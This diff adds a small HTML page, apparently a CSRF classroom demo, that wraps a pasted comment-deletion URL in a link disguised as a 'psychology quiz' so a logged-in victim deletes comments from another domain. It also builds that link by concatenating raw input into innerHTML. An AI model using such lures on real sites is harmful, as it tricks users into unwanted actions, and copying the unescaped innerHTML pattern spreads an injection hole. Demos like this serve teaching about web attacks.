@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>刪除留言</title>
+	</head>
+	<body>
+		<p>從另外一個網域（惡意網站）刪除留言</p>
+		貼上刪除留言的網址 <input id="url" type="text">
+		<button onclick="setId()">確定</button>
+		<p id="fake"></p>
+	</body>
+	<script>
+		function setId() {
+			const url = document.getElementById("url").value
+			const fake = document.getElementById("fake")
+			fake.innerHTML = '<a href="' + url + '">心理測驗</a>'
+		}
+	</script>
+</html>
